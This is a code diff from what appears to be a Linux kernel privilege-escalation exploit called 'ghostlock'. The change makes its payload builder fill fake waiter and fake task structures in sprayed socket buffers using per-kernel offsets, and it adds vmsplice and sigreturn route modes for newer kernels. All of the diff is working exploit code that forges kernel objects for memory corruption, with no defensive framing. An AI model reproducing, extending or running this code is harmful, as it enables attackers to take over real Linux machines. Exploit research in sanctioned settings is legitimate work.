@@ -370,6 +370,18 @@ namespace ghostlock::support {
 
         const profile::kernel_offsets *v = profile_values();
         int32_t compact = session::g_exploit_session.profile.has_compact_waiter();
+        /* The 6.12 vmsplice route is a route-mode value (2), not the 6.1
+         * compact waiter layout. Its waiter page must use the 6.6 layout, but
+         * the fake task needs this kernel's profile task offsets. */
+        const int32_t route_mode =
+                session::g_exploit_session.profile.select_stack_layout()
+                        .compact_waiter.value_or(0);
+        const bool vmsplice_mode = route_mode == 2;
+        const bool sigreturn_mode = route_mode == 3;
+        const bool profile_task_offsets = compact || vmsplice_mode || sigreturn_mode;
+        pr_info("payload layout: waiter=%s task_offsets=%s\n",
+                compact ? "compact" : "6.6",
+                (profile_task_offsets && v) ? "profile" : "target.h");
 
         for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
             unsigned char *p = skb_buf() + chunk + chunk_bias;
@@ -420,26 +432,27 @@ namespace ghostlock::support {
                 put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_WW_CTX_OFF, 0);
             }
 
-            /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
-            uint32_t ft_prio_off = compact
+            /* Use runtime task offsets when the profile carries them; the
+             * target.h values are only the fallback. */
+            uint32_t ft_prio_off = (profile_task_offsets && v)
                                        ? v->task.prio
                                        : ghostlock::profile::fake_task_prio_off();
-            uint32_t ft_nprio_off = compact
+            uint32_t ft_nprio_off = (profile_task_offsets && v)
                                         ? v->task.normal_prio
                                         : ghostlock::profile::fake_task_normal_prio_off();
-            uint32_t ft_tg_off = compact
+            uint32_t ft_tg_off = (profile_task_offsets && v)
                                      ? v->task.sched_task_group
                                      : ghostlock::profile::fake_task_task_group_off();
-            uint32_t ft_pi_lock_off = compact
+            uint32_t ft_pi_lock_off = (profile_task_offsets && v)
                                           ? v->task.pi_lock
                                           : ghostlock::profile::fake_task_pi_lock_off();
-            uint32_t ft_pi_wait_off = compact
+            uint32_t ft_pi_wait_off = (profile_task_offsets && v)
                                           ? v->task.pi_waiters
                                           : ghostlock::profile::fake_task_pi_waiters_off();
-            uint32_t ft_pi_top_off = compact
+            uint32_t ft_pi_top_off = (profile_task_offsets && v)
                                          ? v->task.pi_top_task
                                          : ghostlock::profile::fake_task_pi_top_task_off();
-            uint32_t ft_pi_blocked_off = compact
+            uint32_t ft_pi_blocked_off = (profile_task_offsets && v)
                                              ? v->task.pi_blocked_on
                                              : ghostlock::profile::fake_task_pi_blocked_on_off();
 
